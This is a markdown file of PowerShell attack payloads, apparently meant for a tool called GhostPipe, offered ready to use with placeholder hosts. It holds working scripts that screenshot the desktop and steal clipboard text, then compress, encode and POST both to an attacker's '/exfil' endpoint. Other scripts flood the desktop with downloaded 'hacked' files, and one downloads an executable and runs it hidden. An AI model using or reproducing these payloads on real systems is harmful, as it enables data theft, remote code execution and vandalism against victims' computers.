
# Payload Examples

Remember to change the IP addresses to GhostPipe's live instance address, when exfiltration is possible.

## Take a screenshot and exfiltrate it
```powershell
# Load drawing & forms
[Reflection.Assembly]::LoadWithPartialName("System.Drawing") | Out-Null
[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null

# Capture screenshot
$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bmp    = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
$gfx    = [System.Drawing.Graphics]::FromImage($bmp)
$gfx.CopyFromScreen(0,0,0,0,$bounds.Size)

# Save PNG to memory
$ms = New-Object System.IO.MemoryStream
$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()
$gfx.Dispose()

# GZIP-compress the PNG bytes
$bytes = $ms.ToArray()
$ms.Close()
$ms2 = New-Object System.IO.MemoryStream
$gzip = New-Object System.IO.Compression.GzipStream($ms2, [IO.Compression.CompressionMode]::Compress)
$gzip.Write($bytes, 0, $bytes.Length)
$gzip.Close()
$compressed = $ms2.ToArray()
$ms2.Close()

# Base64-encode
$b64 = [Convert]::ToBase64String($compressed)

# Send as JSON (replace <YOUR_HOST> with your server)
$body = @{ data = $b64; user = $env:USERNAME } | ConvertTo-Json
Invoke-RestMethod -Uri 'http://<YOUR_HOST>:8000/exfil' -Method POST `
    -ContentType 'application/json' -Body $body
```

## Capture clipboard and exfiltrate it

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null;
$clip = [System.Windows.Forms.Clipboard]::GetText();
$bytes = [System.Text.Encoding]::UTF8.GetBytes($clip);
$ms = New-Object IO.MemoryStream;
$gzip = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress);
$gzip.Write($bytes, 0, $bytes.Length);
$gzip.Close();
$encoded = [Convert]::ToBase64String($ms.ToArray());
Invoke-RestMethod -Uri 'http://<YOUR_HOST>:8000/exfil' -Method POST -Body $encoded
```

## Flood desktop with "hacked.txt" files
```powershell
$DesktopPath = [Environment]::GetFolderPath("Desktop")
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SeenKid/flipper-zero-bad-usb/main/utils/files/hacked.txt -OutFile $DesktopPath/H4ck3D.txt
while($ac -lt 200) {
    Copy-Item "$DesktopPath/H4ck3D.txt" -Destination "$DesktopPath/hacked$ac.txt"
    $ac++
}
Start-Process -FilePath "$DesktopPath/H4ck3D.txt"
```

## Simple calc.exe (PoC)
```powershell
calc.exe
```

## Download and execute binary
```powershell
$u = 'https://<YOUR_HOST>/payload.exe'
$out = Join-Path $env:TEMP (“$(New-Guid).exe”)
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($u, $out)
Start-Process -FilePath $out -WindowStyle Hidden -NoNewWindow
```
